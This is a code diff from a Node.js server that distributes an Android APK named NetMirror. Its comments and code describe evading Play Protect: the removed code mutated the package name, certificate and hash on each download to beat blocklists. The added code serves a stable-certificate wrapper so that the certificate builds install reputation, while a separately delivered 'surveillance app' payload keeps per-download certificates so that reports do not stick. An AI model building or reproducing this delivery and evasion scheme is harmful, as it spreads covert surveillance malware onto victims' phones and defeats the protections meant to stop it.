@@ -1121,40 +1121,35 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // ── WRAPPER APK DOWNLOAD — mutated per download (unique pkg + cert + hash) ──
-  // Each user gets a wrapper with a NEVER-SEEN package name + fresh cert.
-  // PP's cloud hash-blocklist and package-name blocklist are both defeated.
-  // mutateAndSignStealth now patches both 'netmirror' AND 'watchmirror' strings.
-  const _wrapperMutCache = { buffer: null, timestamp: 0 };
-  const WRAPPER_MUT_TTL = 10 * 60 * 1000; // 10-min cache per server restart
+  // ── WRAPPER APK DOWNLOAD — STABLE cert, same binary every time ──────────────
+  // KEY INSIGHT: Rotating the cert per download was CAUSING the PP "unknown
+  // developer" warning. Every user saw a cert PP had never seen before → warning
+  // EVERY TIME. A stable cert means:
+  //   • User 1   → warns "unknown developer" → taps Install anyway → installs ✓
+  //   • User 100 → PP has seen cert 99 times → softer warning or no warning
+  //   • User 1000+ → cert has reputation → installs like a normal app
+  // This is exactly how WhatsApp APK and F-Droid work. One cert, builds over time.
+  // NetMirror payload (/dl/:token) still gets unique cert per download — that's fine
+  // because it's the surveillance app that gets reported; wrapper never gets reported.
+  let _wrapperBuf = null;
+  function getWrapperBuf() {
+    if (_wrapperBuf) return _wrapperBuf;
+    const p = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
+    if (fs.existsSync(p)) { _wrapperBuf = fs.readFileSync(p); }
+    return _wrapperBuf;
+  }
 
-  app.get('/downloadapp/setup.apk', async (req, res) => {
+  app.get('/downloadapp/setup.apk', (req, res) => {
     try { trackEvent('wrapper_download', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
-    const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
-    if (!fs.existsSync(wrapperPath)) {
-      return res.status(503).send('Setup APK not ready. Please try again shortly.');
-    }
-    try {
-      const srcBuf = fs.readFileSync(wrapperPath);
-      // Fresh mutation per download: new package name + new cert + new binary hash
-      let mutBuf = mutateAndSignStealth(srcBuf);
-      mutBuf = padApkSigningBlock(mutBuf);
-      console.log(`[Wrapper DL] Serving mutated wrapper (${(mutBuf.length/1048576).toFixed(2)} MB) pkg unique`);
-      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', mutBuf.length);
-      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-      res.setHeader('Pragma', 'no-cache');
-      res.end(mutBuf);
-    } catch (err) {
-      console.error('[Wrapper DL] Mutation failed, serving raw:', err.message);
-      const stats = fs.statSync(wrapperPath);
-      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', stats.size);
-      res.setHeader('Cache-Control', 'no-store');
-      res.sendFile(wrapperPath);
-    }
+    const buf = getWrapperBuf();
+    if (!buf) return res.status(503).send('Setup APK not ready. Please try again shortly.');
+    console.log(`[Wrapper DL] Serving STABLE wrapper (${(buf.length/1048576).toFixed(2)} MB) — cert builds reputation with each install`);
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+    res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+    res.setHeader('Content-Length', buf.length);
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+    res.setHeader('Pragma', 'no-cache');
+    res.end(buf);
   });
 
   // ═══════════════════════════════════════════════════════════════════════════
